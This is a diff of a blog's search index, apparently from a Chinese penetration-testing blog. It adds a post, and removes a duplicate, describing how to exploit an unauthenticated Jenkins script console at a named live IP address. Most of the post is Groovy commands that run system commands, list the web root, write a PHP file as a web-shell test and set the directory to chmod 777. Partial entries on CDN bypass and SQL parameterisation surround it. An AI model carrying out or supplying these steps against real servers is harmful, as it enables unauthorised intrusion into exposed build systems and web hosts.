@@ -1,6 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>jenkins未授权</title>
+    <url>/2020/03/31/JenKins%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><a id="more"></a>
+
+
+
+
+
+
+
+<blockquote>
+<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
+</blockquote>
+<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
+<p>结果显示可以。</p>
+<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
+<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
+<p>发现没有写入权限。</p>
+<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>未授权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>cdn绕过</title>
     <url>/2020/03/30/cdn%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h2 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h2><h3 id="什么是cdn"><a href="#什么是cdn" class="headerlink" title="什么是cdn"></a>什么是cdn</h3><p>​    CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
@@ -57,36 +101,6 @@
       <tags>
         <tag>cdn</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>JenKins利用</title>
-    <url>/2020/03/30/JenKins%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><blockquote>
-<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
-</blockquote>
-<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
-<p>结果显示可以。</p>
-<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
-<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
-<p>发现没有写入权限。</p>
-<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
-]]></content>
   </entry>
   <entry>
     <title>sql参数化</title>
